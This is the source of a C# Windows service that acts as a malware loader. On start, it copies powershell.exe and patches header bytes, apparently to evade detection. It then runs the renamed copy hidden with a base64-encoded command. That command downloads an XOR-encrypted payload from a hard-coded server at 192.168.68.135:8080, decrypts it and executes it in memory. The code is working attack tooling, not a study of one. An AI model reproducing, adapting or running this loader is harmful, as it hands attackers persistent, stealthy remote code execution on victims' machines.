using System;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Diagnostics;
using System.Threading;


namespace //////redacted///////
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            //System.Diagnostics.Debug.WriteLine("Finding file and loading...");
            byte[] bytes = System.IO.File.ReadAllBytes("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            //Re-write DOS to RTO :)
            bytes[108] = 82;
            bytes[109] = 84;
            bytes[110] = 79;
            //System.Diagnostics.Debug.WriteLine("Writing new powerhell.exe...");
            System.IO.File.WriteAllBytes("C:\\Users\\lolbox\\Desktop\\powerhell.exe", bytes); //clean this up
            System.Diagnostics.Debug.WriteLine("Done...");
            //pipeline.Commands.AddScript("set-executionpolicy unrestricted");
            ProcessStartInfo startinfo = new ProcessStartInfo();
            startinfo.CreateNoWindow = false;
            startinfo.UseShellExecute = true;
            startinfo.FileName = @"C:\\Users\\lolbox\\Desktop\\powerhell.exe";
            startinfo.Arguments = @"-NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AUwBlAFIAdgBJAEMARQBQAE8AaQBuAHQATQBhAG4AYQBHAEUAUgBdADoAOgBFAFgAUABFAGMAdAAxADAAMABDAG8AbgB0AEkAbgBVAGUAIAA9ACAAMAA7ACQAVwBDAD0ATgBFAFcALQBPAEIASgBlAEMAVAAgAFMAWQBzAHQARQBtAC4ATgBlAHQALgBXAGUAQgBDAGwASQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgAZQBBAGQAZQBSAFMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAcgBvAHgAWQAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAFQALgBXAEUAQgBSAEUAcQBVAEUAcwBUAF0AOgA6AEQARQBmAEEAdQBsAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIATwBYAHkALgBDAHIAZQBEAEUAbgBUAGkAQQBsAFMAIAA9ACAAWwBTAFkAUwB0AEUAbQAuAE4ARQB0AC4AQwBSAEUAZABlAG4AVABpAGEATABDAGEAYwBIAEUAXQA6ADoARABFAGYAQQB1AGwAdABOAGUAVABXAE8AUgBLAEMAUgBFAEQARQBOAFQASQBBAEwAUwA7ACQASwA9ACcAMAAwADkAYgAzADIAZgAxAGYAMgBlAGYAOAA4AGEAMwBmAGQANQAyAGEAZAAzAGUAZgAwAGEAZQA1ADUAYQBhACcAOwAkAGkAPQAwADsAWwBDAEgAYQByAFsAXQBdACQAQgA9ACgAWwBjAGgAQQByAFsAXQBdACgAJABXAGMALgBEAG8AVwBuAEwAbwBhAGQAUwB0AHIAaQBuAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADYAOAAuADEAMwA1ADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACIAKQApACkAfAAlAHsAJABfAC0AQgBYAG8AUgAkAEsAWwAkAEkAKwArACUAJABrAC4ATABFAE4ARwB0AEgAXQB9ADsASQBFAFgAIAAoACQAYgAtAGoAbwBJAG4AJwAnACkA";
            Process.Start(startinfo);
        }

        protected override void OnStop()
        {
        }
    }
}
